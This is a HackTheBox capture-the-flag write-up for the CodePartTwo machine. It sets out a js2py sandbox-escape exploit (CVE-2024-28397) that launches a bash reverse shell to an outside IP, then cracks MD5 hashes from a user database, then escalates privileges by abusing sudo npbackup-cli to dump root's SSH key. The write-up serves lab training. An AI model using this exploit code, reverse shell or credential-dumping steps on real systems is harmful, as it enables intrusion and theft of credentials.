# HackTheBox - CodePartTwo
**Youtube video:** https://youtu.be/dQqKRxrY4IU
---
## Initial Foothold

**Enumeration:**
```bash
# We download the app and we see js2py 0.74
```

**Exploit:** CVE-2024-28397 - js2py Sandbox Escape
- **Payload:** https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

**Exploit Code:**
```javascript
# Put the next code after you sign up and sign in
let cmd = "bash -c 'bash >& /dev/tcp/10.10.14.107/4444 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

**Extract Credentials:**
```bash
# Extract from database after rev shell
sqlite3 users.db

# Crack MD5 hashes
john --wordlist=$rockyou hashes.md5 --format=Raw-MD5
```

---
## Priv Esc

**NPBackup Exploitation:**
```bash
# Edite the .conf file and change path dir to:
- PATH: /root

# Force a backup
sudo npbackup-cli -c npbackup.conf -b -f

# Dump root SSH key
sudo npbackup-cli -c npbackup.conf --dump /root/.ssh/id_rsa
```
